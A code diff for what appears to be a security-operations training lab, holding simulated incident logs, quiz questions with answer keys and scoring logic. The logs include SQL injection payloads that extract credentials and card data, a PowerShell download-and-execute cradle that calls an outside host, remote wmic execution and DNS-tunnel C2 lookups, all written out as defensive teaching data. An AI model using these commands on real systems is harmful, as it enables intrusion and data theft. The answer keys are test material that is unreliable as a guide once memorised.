+                { id:20, ts:'2026-02-15 09:18:01', badge:'win', src:'WS-ACCTG-04', msg:'EventID <span class="hi-red">4698</span> — Scheduled Task Created | Task: \\Microsoft\\Windows\\<span class="hi-orange">WinUpdate_svc</span> | Command: powershell.exe -ep bypass -f C:\\Windows\\Temp\\u.ps1 | Account: administrator' },
+            ]
+        },
+
+        /* ======================================================
+           SCENARIO 3 — WEB APPLICATION ATTACK
+        ====================================================== */
+        {
+            id: 'scn3',
+            title: 'SCN-03: Web Application Attack',
+            difficulty: 'medium',
+            brief: `<strong>Context:</strong> Apache access logs from <strong>web01.hexworth.local</strong> (10.0.8.10) covering a 14-minute window. A threat actor probed and exploited the customer portal. Identify the attack vector, successful exploitation attempt, and potential data exfiltration.<br><br><strong>Format:</strong> [IP] [Date/Time] "METHOD /path HTTP/version" [Status] [Bytes] "[Referrer]" "[User-Agent]"`,
+            instructions: 'Flag reconnaissance probes, injection attempts, successful exploitation, and exfiltration requests.',
+            flaggableIds: [4,5,7,9,11,12,13,15,16,17,18],
+            maxFlagScore: 110,
+            questions: [
+                {
+                    id: 'q1', text: 'What type of attack is evidenced by entries #9 and #11?',
+                    options: [
+                        'Cross-Site Scripting (XSS)',
+                        'SQL Injection (UNION-based)',
+                        'XML External Entity (XXE)',
+                        'Directory Traversal'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q2', text: 'HTTP status 200 in entry #12 compared to 400/403 in prior probes most likely indicates:',
+                    options: [
+                        'The WAF allowed the request but the database query failed',
+                        'The injection succeeded and the application returned data',
+                        'The attacker changed to a GET request which is always allowed',
+                        'Status 200 is a false positive — the server returned an error page'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q3', text: 'Entries #16–18 show large outbound responses (bytes > 80,000) to the attacker. This is most consistent with:',
+                    options: [
+                        'Normal file download activity from the web portal',
+                        'Data exfiltration — the attacker is extracting database records via HTTP responses',
+                        'A DDoS amplification attack using the web server',
+                        'A brute-force attack on the download endpoint'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q4', text: 'Entry #4 (nikto scanner user-agent) indicates the attacker first performed:',
+                    options: [
+                        'Weaponization — building the exploit payload',
+                        'Lateral movement — enumerating internal services',
+                        'Reconnaissance — automated vulnerability scanning',
+                        'Exfiltration — downloading application source code'
+                    ],
+                    correct: 2
+                }
+            ],
+            logs: [
+                { id:1,  ts:'2026-02-15 11:02:04', badge:'web', src:'web01', msg:'10.14.4.5 - - "GET /portal/login HTTP/1.1" 200 4821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64)"' },
+                { id:2,  ts:'2026-02-15 11:02:47', badge:'web', src:'web01', msg:'10.14.4.5 - - "POST /portal/login HTTP/1.1" 302 0 "/portal/login" "Mozilla/5.0 (Windows NT 10.0; Win64)"' },
+                { id:3,  ts:'2026-02-15 11:03:12', badge:'web', src:'web01', msg:'10.14.4.5 - - "GET /portal/dashboard HTTP/1.1" 200 12443 "-" "Mozilla/5.0 (Windows NT 10.0; Win64)"' },
+                { id:4,  ts:'2026-02-15 11:04:01', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/ HTTP/1.1" 200 4821 "-" "<span class="hi-orange">Nikto/2.1.6</span>"' },
+                { id:5,  ts:'2026-02-15 11:04:03', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/admin HTTP/1.1" 403 312 "-" "<span class="hi-orange">Nikto/2.1.6</span>"' },
+                { id:6,  ts:'2026-02-15 11:04:51', badge:'web', src:'web01', msg:'10.14.9.3 - - "GET /portal/reports?id=1044 HTTP/1.1" 200 8811 "-" "Mozilla/5.0 (Macintosh)"' },
+                { id:7,  ts:'2026-02-15 11:05:14', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=1044<span class="hi-orange">%27</span> HTTP/1.1" 500 941 "-" "python-requests/2.28"' },
+                { id:8,  ts:'2026-02-15 11:05:29', badge:'web', src:'web01', msg:'10.14.4.5 - - "GET /portal/invoices?month=2026-01 HTTP/1.1" 200 31042 "-" "Mozilla/5.0 (Windows NT 10.0)"' },
+                { id:9,  ts:'2026-02-15 11:05:44', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=1<span class="hi-orange">+UNION+SELECT+null,table_name,null+FROM+information_schema.tables--</span> HTTP/1.1" 400 488 "-" "sqlmap/1.7.8"' },
+                { id:10, ts:'2026-02-15 11:06:02', badge:'web', src:'web01', msg:'10.14.9.3 - - "GET /portal/reports?id=1045 HTTP/1.1" 200 9211 "-" "Mozilla/5.0 (Macintosh)"' },
+                { id:11, ts:'2026-02-15 11:06:19', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+username,password,email+FROM+users--</span> HTTP/1.1" 403 312 "-" "sqlmap/1.7.8"' },
+                { id:12, ts:'2026-02-15 11:06:55', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+username,password_hash,role+FROM+accounts--</span> HTTP/1.1" <span class="hi-red">200</span> 14882 "-" "sqlmap/1.7.8"' },
+                { id:13, ts:'2026-02-15 11:07:21', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+card_number,cvv,exp_date+FROM+payment_records--</span> HTTP/1.1" 200 28811 "-" "sqlmap/1.7.8"' },
+                { id:14, ts:'2026-02-15 11:08:04', badge:'web', src:'web01', msg:'10.14.4.5 - - "POST /portal/upload HTTP/1.1" 200 244 "/portal/settings" "Mozilla/5.0 (Windows NT 10.0)"' },
+                { id:15, ts:'2026-02-15 11:08:30', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+ssn,dob,address+FROM+customers+LIMIT+500--</span> HTTP/1.1" 200 92041 "-" "python-requests/2.28"' },
+                { id:16, ts:'2026-02-15 11:09:02', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+ssn,dob,address+FROM+customers+LIMIT+500+OFFSET+500--</span> HTTP/1.1" 200 88334 "-" "python-requests/2.28"' },
+                { id:17, ts:'2026-02-15 11:09:35', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+ssn,dob,address+FROM+customers+LIMIT+500+OFFSET+1000--</span> HTTP/1.1" 200 80129 "-" "python-requests/2.28"' },
+                { id:18, ts:'2026-02-15 11:10:14', badge:'web', src:'web01', msg:'<span class="hi-red">198.51.100.77</span> - - "GET /portal/reports?id=0<span class="hi-orange">+UNION+SELECT+ssn,dob,address+FROM+customers+LIMIT+500+OFFSET+1500--</span> HTTP/1.1" 200 81902 "-" "python-requests/2.28"' },
+                { id:19, ts:'2026-02-15 11:11:44', badge:'web', src:'web01', msg:'10.14.4.5 - - "GET /portal/dashboard HTTP/1.1" 200 12443 "-" "Mozilla/5.0 (Windows NT 10.0)"' },
+                { id:20, ts:'2026-02-15 11:16:01', badge:'web', src:'web01', msg:'10.14.9.3 - - "POST /portal/logout HTTP/1.1" 302 0 "/portal/dashboard" "Mozilla/5.0 (Macintosh)"' },
+            ]
+        },
+
+        /* ======================================================
+           SCENARIO 4 — LATERAL MOVEMENT
+        ====================================================== */
+        {
+            id: 'scn4',
+            title: 'SCN-04: Lateral Movement',
+            difficulty: 'medium',
+            brief: `<strong>Context:</strong> Mixed-source logs from the internal network during a 35-minute incident window on 2026-02-15. Sources include firewall (FW-CORE), Windows event logs (WS-DEV-12, FS-PROD-01), and DNS server (DNS-INT-01).<br><br><strong>Attack chain:</strong> External RDP → internal recon → SMB pivot → C2 beaconing via DNS. Log source badges help you correlate the sequence.`,
+            instructions: 'Trace the full attack chain. Flag all entries that form part of the lateral movement sequence.',
+            flaggableIds: [1,4,5,6,8,10,12,14,16,18,20,22],
+            maxFlagScore: 120,
+            questions: [
+                {
+                    id: 'q1', text: 'The initial access vector (entry #1) exploited which service?',
+                    options: [
+                        'SMB (TCP/445) — EternalBlue exploit',
+                        'RDP (TCP/3389) — likely via stolen credentials',
+                        'WinRM (TCP/5985) — PowerShell remoting',
+                        'FTP (TCP/21) — anonymous access'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q2', text: 'Entries #4–6 show nmap-style scans of internal hosts. What MITRE ATT&CK technique does this represent?',
+                    options: [
+                        'T1021 — Remote Services',
+                        'T1046 — Network Service Discovery',
+                        'T1070 — Indicator Removal',
+                        'T1110 — Brute Force'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q3', text: 'Entries #14 and #16 show SMB connections from a compromised host (WS-DEV-12) to FS-PROD-01. This is most consistent with:',
+                    options: [
+                        'Legitimate file sharing between workstations on the same VLAN',
+                        'Lateral movement via SMB pass-the-hash or credential reuse',
+                        'A misconfigured backup agent running during business hours',
+                        'A Windows Update requiring access to a shared update folder'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q4', text: 'Entry #18 shows repeated DNS queries for a long subdomain of a low-reputation domain. This is a classic IOC for:',
+                    options: [
+                        'DNS cache poisoning attack',
+                        'DNS-over-HTTPS (DoH) misconfiguration',
+                        'DNS tunneling used for C2 communication',
+                        'BGP hijacking preparation'
+                    ],
+                    correct: 2
+                }
+            ],
+            logs: [
+                { id:1,  ts:'2026-02-15 14:03:11', badge:'fw',     src:'FW-CORE',    msg:'ALLOW TCP 203.0.113.44:51822 → 10.0.1.15:3389 [RDP] | Policy: EXTERNAL-IN | New Session | Bytes: 0' },
+                { id:2,  ts:'2026-02-15 14:03:14', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4624 — Logon Type 10 (RemoteInteractive/RDP) | Account: tadmin | Source IP: 203.0.113.44 | Success' },
+                { id:3,  ts:'2026-02-15 14:05:22', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4624 — Logon Type 2 (Interactive) | Account: developer1 | Source: localhost | Success' },
+                { id:4,  ts:'2026-02-15 14:06:44', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4688 — Process Created | Creator: cmd.exe | New Process: <span class="hi-orange">nmap.exe</span> | Account: tadmin | CommandLine: nmap.exe -sV -p 22,445,3389,5985 <span class="hi-red">10.14.0.0/24</span>' },
+                { id:5,  ts:'2026-02-15 14:06:47', badge:'fw',     src:'FW-CORE',    msg:'ALERT — Port Scan Detected | Source: 10.0.1.15 | Scan targets: 10.14.0.1–10.14.0.254 | Ports: 22,445,3389,5985 | Rate: 48 hosts/sec' },
+                { id:6,  ts:'2026-02-15 14:06:49', badge:'fw',     src:'FW-CORE',    msg:'BLOCK TCP 10.0.1.15 → 10.14.2.0/24:3389 [RDP] | Reason: IPS-SCAN-BLOCK | 31 connections dropped' },
+                { id:7,  ts:'2026-02-15 14:08:04', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4688 — Process Created | Creator: explorer.exe | New Process: chrome.exe | Account: developer1 | PID: 6812' },
+                { id:8,  ts:'2026-02-15 14:09:15', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4688 — Process Created | Creator: cmd.exe | New Process: <span class="hi-orange">net.exe</span> | Account: tadmin | CommandLine: net view \\\\<span class="hi-red">10.14.1.0/24</span> /all' },
+                { id:9,  ts:'2026-02-15 14:10:03', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4648 — Logon using Explicit Credentials | Attempting: tadmin → FS-PROD-01 | Target Account: administrator | Process: cmd.exe' },
+                { id:10, ts:'2026-02-15 14:10:22', badge:'fw',     src:'FW-CORE',    msg:'ALLOW TCP 10.0.1.15:55201 → <span class="hi-red">10.14.1.20:445</span> [SMB] | Policy: INTERNAL-EAST-WEST | New Session' },
+                { id:11, ts:'2026-02-15 14:11:41', badge:'win',    src:'WS-DEV-12',  msg:'EventID 4624 — Logon Type 3 (Network) | Account: svc_backup | Source: 10.0.1.15 | Success (Kerberos)' },
+                { id:12, ts:'2026-02-15 14:12:08', badge:'win',    src:'WS-DEV-12',  msg:'EventID <span class="hi-red">4688</span> — Process Created | Creator: cmd.exe | New Process: <span class="hi-red">wmic.exe</span> | Account: tadmin | CommandLine: wmic /node:<span class="hi-orange">10.14.1.20</span> process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"' },
+                { id:13, ts:'2026-02-15 14:13:00', badge:'win',    src:'FS-PROD-01', msg:'EventID 4624 — Logon Type 3 (Network) | Account: administrator | Source: 10.0.1.15 | Success' },
+                { id:14, ts:'2026-02-15 14:13:44', badge:'win',    src:'FS-PROD-01', msg:'EventID <span class="hi-red">4672</span> — Special Privileges Assigned | Account: administrator | LogonID: 0x7B2C1 | Privileges: SeBackupPrivilege, SeDebugPrivilege' },
+                { id:15, ts:'2026-02-15 14:15:12', badge:'win',    src:'FS-PROD-01', msg:'EventID 4663 — Object Access | Object: \\\\FS-PROD-01\\HR_Shared\\2026\\employee_records.xlsx | Account: administrator | Access: ReadData' },
+                { id:16, ts:'2026-02-15 14:15:55', badge:'fw',     src:'FW-CORE',    msg:'ALLOW TCP 10.14.1.20:44112 → <span class="hi-red">10.14.3.18:445</span> [SMB] | Policy: INTERNAL-EAST-WEST | New Session | Note: FS-PROD-01 is source — unusual' },
+                { id:17, ts:'2026-02-15 14:17:33', badge:'win',    src:'FS-PROD-01', msg:'EventID 4688 — Process Created | Creator: svchost.exe | New Process: WmiPrvSE.exe | Account: SYSTEM | PID: 2241' },
+                { id:18, ts:'2026-02-15 14:22:08', badge:'dns',    src:'DNS-INT-01', msg:'QUERY A | Client: 10.14.1.20 | Name: <span class="hi-orange">a8f3bc12e4d17.c2metrics-global.xyz</span> | Result: NXDOMAIN | Repeat: 12x in 60s' },
+                { id:19, ts:'2026-02-15 14:23:01', badge:'dns',    src:'DNS-INT-01', msg:'QUERY A | Client: 10.14.1.20 | Name: <span class="hi-orange">b1e9cd44f820a.c2metrics-global.xyz</span> | Result: NXDOMAIN | Repeat: 9x in 60s' },
+                { id:20, ts:'2026-02-15 14:24:44', badge:'dns',    src:'DNS-INT-01', msg:'QUERY TXT | Client: 10.14.1.20 | Name: <span class="hi-red">cmd.exec.9f4a1c.c2metrics-global.xyz</span> | Result: TXT "aWZjb25maWc..." | <span class="hi-orange">Base64 payload in TXT record</span>' },
+                { id:21, ts:'2026-02-15 14:27:11', badge:'win',    src:'FS-PROD-01', msg:'EventID 4634 — Account Logoff | Account: svc_backup | LogonID: 0x5C9A2' },
+                { id:22, ts:'2026-02-15 14:28:02', badge:'edr',    src:'EDR-AGENT',  msg:'ALERT HIGH — <span class="hi-red">DNS Tunneling Behavior</span> | Host: FS-PROD-01 (10.14.1.20) | Process: powershell.exe (PID 3314) | Query rate: 1 req/5s | Domain: c2metrics-global.xyz | Reputation: MALICIOUS' },
+            ]
+        },
+
+        /* ======================================================
+           SCENARIO 5 — FULL KILL CHAIN
+        ====================================================== */
+        {
+            id: 'scn5',
+            title: 'SCN-05: Full Kill Chain',
+            difficulty: 'hard',
+            brief: `<strong>Context:</strong> You are reviewing aggregated SIEM output from a full incident spanning 2026-02-15 07:00–16:30. Logs come from ALL sources: perimeter firewall, email gateway, endpoint, Windows event, DNS, and DLP. Map the complete attack chain from initial access to exfiltration.<br><br><strong>MITRE ATT&CK phases to look for:</strong> Recon → Initial Access → Execution → Persistence → Privilege Escalation → Lateral Movement → Collection → Exfiltration`,
+            instructions: 'Flag every entry that is part of the kill chain. Normal business activity is mixed in to test your precision.',
+            flaggableIds: [2,3,5,7,9,11,13,15,16,18,20,22,24,25],
+            maxFlagScore: 140,
+            questions: [
+                {
+                    id: 'q1', text: 'The correct chronological MITRE ATT&CK phase order for this incident is:',
+                    options: [
+                        'Phishing → Execution → Lateral Movement → Exfiltration → Persistence',
+                        'Recon → Phishing (Initial Access) → Macro Execution → Persistence → Priv Esc → Lateral Movement → Collection → Exfiltration',
+                        'Initial Access → Recon → Credential Access → Exfiltration → Lateral Movement',
+                        'Brute Force → RDP → Lateral Movement → Ransomware Deployment'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q2', text: 'Entry #5 shows a macro-enabled document executing via email. What initial access technique (MITRE) does this represent?',
+                    options: [
+                        'T1566.001 — Spearphishing Attachment',
+                        'T1566.002 — Spearphishing Link',
+                        'T1190 — Exploit Public-Facing Application',
+                        'T1078 — Valid Accounts'
+                    ],
+                    correct: 0
+                },
+                {
+                    id: 'q3', text: 'Entry #13 shows a scheduled task using a disguised name (Windows_Telemetry_svc). What persistence technique is this?',
+                    options: [
+                        'T1543.003 — Windows Service',
+                        'T1053.005 — Scheduled Task',
+                        'T1547.001 — Registry Run Keys',
+                        'T1574.001 — DLL Search Order Hijacking'
+                    ],
+                    correct: 1
+                },
+                {
+                    id: 'q4', text: 'Entry #24 (DLP alert: 47MB ZIP to MEGA.NZ over HTTPS) represents which final kill chain phase?',
+                    options: [
+                        'Collection (T1005 — Data from Local System)',
+                        'Command and Control (T1071 — Application Layer Protocol)',
+                        'Exfiltration (T1041 / T1537 — Exfiltration Over Web Service)',
+                        'Lateral Movement (T1021 — Remote Services)'
+                    ],
+                    correct: 2
+                }
+            ],
+            logs: [
+                { id:1,  ts:'2026-02-15 07:12:04', badge:'fw',     src:'FW-EDGE',    msg:'ALLOW TCP 10.14.8.3:60011 → 8.8.8.8:53 [DNS] | Routine query | User: slee' },
+                { id:2,  ts:'2026-02-15 07:48:19', badge:'fw',     src:'FW-EDGE',    msg:'ALERT — Inbound email attachment scan | From: invoices@hexwroth-billing.com | To: kpatel@hexworth.local | <span class="hi-orange">Attachment: Q1_Invoice_Final.xlsm [MACRO-ENABLED]</span> | AV: Clean (evasion suspected)' },
+                { id:3,  ts:'2026-02-15 07:49:02', badge:'edr',    src:'WS-HR-07',   msg:'ALERT — <span class="hi-orange">Office macro execution</span> | File: Q1_Invoice_Final.xlsm | Process: EXCEL.EXE → <span class="hi-red">cmd.exe</span> → <span class="hi-red">mshta.exe</span> | User: kpatel | Host: WS-HR-07 (10.14.8.22)' },
+                { id:4,  ts:'2026-02-15 07:51:30', badge:'win',    src:'WS-HR-07',   msg:'EventID 4624 — Logon Type 2 (Interactive) | Account: kpatel | Source: localhost | Success (routine)' },
+                { id:5,  ts:'2026-02-15 07:49:44', badge:'win',    src:'WS-HR-07',   msg:'EventID <span class="hi-red">4688</span> — Process Created | Creator: mshta.exe | New Process: <span class="hi-red">powershell.exe</span> | Account: kpatel | CommandLine: powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'<span class="hi-orange">http://45.142.212.33/drop/stage1.ps1</span>\')"' },
+                { id:6,  ts:'2026-02-15 07:52:11', badge:'win',    src:'WS-HR-07',   msg:'EventID 4634 — Account Logoff | Account: bwong | LogonID: 0x4A112 | Routine session end' },
+                { id:7,  ts:'2026-02-15 07:50:02', badge:'fw',     src:'FW-EDGE',    msg:'ALLOW TCP 10.14.8.22:58801 → <span class="hi-red">45.142.212.33:80</span> [HTTP] | Outbound C2 connection | URL: /drop/stage1.ps1 | Bytes-out: 0, Bytes-in: 38441' },
+                { id:8,  ts:'2026-02-15 08:01:44', badge:'win',    src:'WS-HR-07',   msg:'EventID 4624 — Logon Type 3 (Network) | Account: svc_scanner | Source: 10.14.2.1 | Routine scheduled task' },
+                { id:9,  ts:'2026-02-15 08:05:11', badge:'edr',    src:'WS-HR-07',   msg:'ALERT — <span class="hi-red">LSASS memory read</span> | Process: powershell.exe (PID 4441) → lsass.exe | Technique: T1003.001 | User: kpatel | <span class="hi-orange">Credential Dumping attempt</span>' },
+                { id:10, ts:'2026-02-15 08:12:04', badge:'win',    src:'WS-HR-07',   msg:'EventID 4624 — Logon Type 2 (Interactive) | Account: agarcia | Source: localhost | Success (routine)' },
+                { id:11, ts:'2026-02-15 08:15:33', badge:'win',    src:'WS-HR-07',   msg:'EventID <span class="hi-red">4648</span> — Logon using Explicit Credentials | Account: kpatel → <span class="hi-orange">DC-01 (10.14.0.10)</span> | Using: domain\\administrator | Process: powershell.exe' },
+                { id:12, ts:'2026-02-15 08:22:00', badge:'win',    src:'WS-HR-07',   msg:'EventID 4688 — Process Created | Creator: MsMpEng.exe (Defender) | New Process: MpCmdRun.exe | Account: SYSTEM | Routine AV scan' },
+                { id:13, ts:'2026-02-15 08:18:44', badge:'win',    src:'WS-HR-07',   msg:'EventID <span class="hi-red">4698</span> — Scheduled Task Created | Task: \\Microsoft\\Windows\\<span class="hi-orange">Windows_Telemetry_svc</span> | Command: powershell.exe -ep bypass -f C:\\ProgramData\\telemetry_svc.ps1 | Account: administrator' },
+                { id:14, ts:'2026-02-15 08:31:12', badge:'win',    src:'DC-01',      msg:'EventID 4624 — Logon Type 3 (Network) | Account: jsmith | Source: 10.14.4.3 | Success (Kerberos ticket)' },
+                { id:15, ts:'2026-02-15 08:25:18', badge:'win',    src:'DC-01',      msg:'EventID <span class="hi-red">4672</span> — Special Privileges Assigned | Account: administrator | LogonID: 0x9F2B3 | Source: <span class="hi-red">10.14.8.22</span> | Privileges: SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege' },
+                { id:16, ts:'2026-02-15 09:04:02', badge:'fw',     src:'FW-CORE',    msg:'ALLOW TCP 10.14.0.10:59201 → <span class="hi-red">10.14.5.30:445</span> [SMB] | Source: DC-01 | Destination: FS-ARCHIVE-01 | <span class="hi-orange">DC pivoting to file server via SMB — unusual</span>' },
+                { id:17, ts:'2026-02-15 09:08:14', badge:'win',    src:'DC-01',      msg:'EventID 4624 — Logon Type 3 (Network) | Account: mrodriguez | Source: 10.14.4.8 | Success (routine)' },
+                { id:18, ts:'2026-02-15 09:11:47', badge:'win',    src:'FS-ARCHIVE-01', msg:'EventID <span class="hi-red">4663</span> — Multiple Object Access Events | Object: \\\\FS-ARCHIVE-01\\Archives\\2024\\* | Account: administrator | Operations: ReadData ×2841 | <span class="hi-orange">Bulk read — 2841 files in 4 minutes</span>' },
+                { id:19, ts:'2026-02-15 09:15:03', badge:'win',    src:'DC-01',      msg:'EventID 4688 — Process Created | Creator: spoolsv.exe | New Process: PrintIsolationHost.exe | Account: SYSTEM | Routine' },
+                { id:20, ts:'2026-02-15 09:18:41', badge:'edr',    src:'FS-ARCHIVE-01', msg:'ALERT HIGH — <span class="hi-red">Staging behavior detected</span> | Process: powershell.exe (PID 6614) | Action: compress 2841 files → C:\\Windows\\Temp\\<span class="hi-orange">arch_bk.zip</span> (47.2 MB) | Account: administrator' },
+                { id:21, ts:'2026-02-15 09:24:18', badge:'win',    src:'FS-ARCHIVE-01', msg:'EventID 4634 — Account Logoff | Account: svc_print | LogonID: 0x2B118 | Routine' },
+                { id:22, ts:'2026-02-15 09:31:04', badge:'dns',    src:'DNS-INT-01', msg:'QUERY A | Client: 10.14.5.30 | Name: <span class="hi-orange">mega.nz</span> | Result: 185.40.4.135 | Process: powershell.exe | <span class="hi-dim">Known file-sharing / exfil destination</span>' },
+                { id:23, ts:'2026-02-15 09:33:22', badge:'win',    src:'FS-ARCHIVE-01', msg:'EventID 4688 — Process Created | Creator: SearchIndexer.exe | New Process: SearchFilterHost.exe | Account: SYSTEM | Routine indexing' },
+                { id:24, ts:'2026-02-15 09:34:55', badge:'edr',    src:'FS-ARCHIVE-01', msg:'DLP ALERT CRITICAL — <span class="hi-red">Exfiltration detected</span> | Process: powershell.exe → HTTPS to mega.nz (185.40.4.135:443) | Data: arch_bk.zip | Size: <span class="hi-orange">47.2 MB uploaded</span> | Classification: CONFIDENTIAL' },
+                { id:25, ts:'2026-02-15 09:36:12', badge:'fw',     src:'FW-EDGE',    msg:'ALLOW TCP 10.14.5.30:61200 → <span class="hi-red">185.40.4.135:443</span> [HTTPS] | <span class="hi-orange">47.2 MB outbound transfer</span> | Duration: 92s | DLP tag: EXFIL-CONFIRMED' },
+            ]
+        }
+    ];
+
+    /* ============================================================
+       GAME STATE
+    ============================================================ */
+    const State = {
+        currentScenario: 0,
+        totalScore:      0,
+        maxScore:        0,
+        flagCount:       0,        // flags placed this round
+        submitted:       false,    // round submitted?
+        roundScores:     [],       // per-round score objects
+        totalFlagsCorrect:   0,
+        totalQuestionsCorrect: 0
+    };
+
+    /* Per-scenario question answer tracking: qIdx → selectedOption */
+    let questionSelections = {};
+
+    /* ============================================================
+       INIT
+    ============================================================ */
+    function startLab() {
+        document.getElementById('intro-screen').style.display = 'none';
+        loadScenario(0);
+    }
+
+    function loadScenario(idx) {
+        const scn = SCENARIOS[idx];
+        State.currentScenario = idx;
+        State.submitted = false;
+        questionSelections = {};
+
+        /* Header updates */
+        document.getElementById('hm-scenario').textContent = `${idx + 1} / 5`;
+        updateDots(idx);
+
+        /* Log panel header */
+        document.getElementById('scenario-name').textContent = scn.title;
+        document.getElementById('flag-counter').textContent = 'Flagged: 0';
+
+        /* Render logs */
+        renderLogs(scn);
+
+        /* Analysis panel */
+        renderBrief(scn);
+        document.getElementById('questions-area').innerHTML = '';
+        document.getElementById('questions-area').classList.remove('visible');
+        document.getElementById('round-score-box').classList.remove('visible');
+        document.getElementById('round-score-box').innerHTML = '';
+        document.getElementById('btn-submit').classList.add('visible');
+        document.getElementById('btn-next').classList.remove('visible');
+        document.getElementById('btn-next').textContent =
+            idx === SCENARIOS.length - 1 ? 'Complete Lab' : 'Next Scenario →';
+    }
+
+    /* ============================================================
+       LOG RENDERING
+    ============================================================ */
+    function renderLogs(scn) {
+        const viewer = document.getElementById('log-viewer');
+        viewer.innerHTML = '';
+
+        scn.logs.forEach((entry) => {
+            const row = document.createElement('div');
+            row.className = 'log-entry';
+            row.dataset.id = entry.id;
+
+            /* Determine badge class */
+            const badgeClass = {
+                syslog: 'badge-syslog',
+                win:    'badge-win',
+                web:    'badge-web',
+                fw:     'badge-fw',
+                dns:    'badge-dns',
+                edr:    'badge-edr'
+            }[entry.badge] || 'badge-syslog';
+
+            const badgeLabel = {
+                syslog: 'SYSLOG',
+                win:    'WIN-EVT',
+                web:    'APACHE',
+                fw:     'FIREWALL',
+                dns:    'DNS',
+                edr:    'EDR'
+            }[entry.badge] || entry.badge.toUpperCase();
+
+            row.innerHTML = `
+                <span class="log-flag-icon">&#9873;</span>
+                <span class="log-line-num">${entry.id}</span>
+                <span class="log-ts">${entry.ts}</span>
+                <span class="log-badge ${badgeClass}">${badgeLabel}</span>
+                <span class="log-msg">${entry.msg}</span>
+            `;
+
+            row.addEventListener('click', () => toggleFlag(row, entry.id));
+            viewer.appendChild(row);
+        });
+    }
+
+    /* ============================================================
+       FLAG TOGGLE
+    ============================================================ */
+    function toggleFlag(row, id) {
+        if (State.submitted) return;
+        row.classList.toggle('flagged');
+        updateFlagCounter();
+    }
+
+    function updateFlagCounter() {
+        const count = document.querySelectorAll('.log-entry.flagged').length;
+        document.getElementById('flag-counter').textContent = `Flagged: ${count}`;
+    }
+
+    /* ============================================================
+       BRIEF RENDERING
+    ============================================================ */
+    function renderBrief(scn) {
+        const diffClass = { easy: 'diff-easy', medium: 'diff-medium', hard: 'diff-hard' }[scn.difficulty];
+        const diffLabel = scn.difficulty.toUpperCase();
+
+        document.getElementById('ap-brief').innerHTML = `
+            <span class="diff-badge ${diffClass}">${diffLabel}</span><br>
+            ${scn.brief}
+        `;
+
+        document.getElementById('flag-instructions').innerHTML = `
+            <strong style="color:var(--accent-dim)">INSTRUCTIONS</strong><br>
+            ${scn.instructions}
+        `;
+    }
+
+    /* ============================================================
+       ANALYZE — show questions after flagging
+    ============================================================ */
+    function analyzeAndShowQuestions() {
+        const scn = SCENARIOS[State.currentScenario];
+        const questionsArea = document.getElementById('questions-area');
+        questionsArea.innerHTML = '';
+
+        scn.questions.forEach((q, qi) => {
+            const block = document.createElement('div');
+            block.className = 'question-block';
+            block.innerHTML = `<div class="q-text">Q${qi + 1}. ${q.text}</div>`;
+
+            q.options.forEach((opt, oi) => {
+                const label = document.createElement('label');
+                label.className = 'q-option';
+                label.dataset.qi = qi;
+                label.dataset.oi = oi;
+                label.innerHTML = `
+                    <input type="radio" name="q${qi}" value="${oi}">
+                    <span>${opt}</span>
+                `;
+                label.querySelector('input').addEventListener('change', () => {
+                    /* Deselect siblings */
+                    block.querySelectorAll('.q-option').forEach(l => l.classList.remove('selected'));
+                    label.classList.add('selected');
+                    questionSelections[qi] = oi;
+                });
+                block.appendChild(label);
+            });
+
+            questionsArea.appendChild(block);
+        });
+
+        questionsArea.classList.add('visible');
+        document.getElementById('btn-submit').textContent = 'Submit Analysis';
+        document.getElementById('btn-submit').onclick = submitAnalysis;
+
+        /* Scroll log viewer back to top */
+        document.getElementById('log-viewer').scrollTop = 0;
+    }
+
+    /* ============================================================
+       SUBMIT ANALYSIS — score the round
+    ============================================================ */
+    function submitAnalysis() {
+        if (State.submitted) return;
+        State.submitted = true;
+
+        const scn = SCENARIOS[State.currentScenario];
+        const flaggableSet = new Set(scn.flaggableIds);
+
+        /* Get flagged IDs */
+        const flaggedRows = document.querySelectorAll('.log-entry.flagged');
+        const flaggedIds = Array.from(flaggedRows).map(r => parseInt(r.dataset.id, 10));
+
+        /* Lock all log entries */
+        document.querySelectorAll('.log-entry').forEach(r => r.classList.add('locked'));
+
+        /* Score flags */
+        let flagScore = 0;
+        let flagsCorrect = 0;
+        let flagsWrong = 0;
+
+        scn.logs.forEach(entry => {
+            const row = document.querySelector(`.log-entry[data-id="${entry.id}"]`);
+            const wasFlagged = flaggedIds.includes(entry.id);
+            const isMalicious = flaggableSet.has(entry.id);
+
+            if (wasFlagged && isMalicious) {
+                row.classList.add('correct-flag');
+                flagScore += 10;
+                flagsCorrect++;
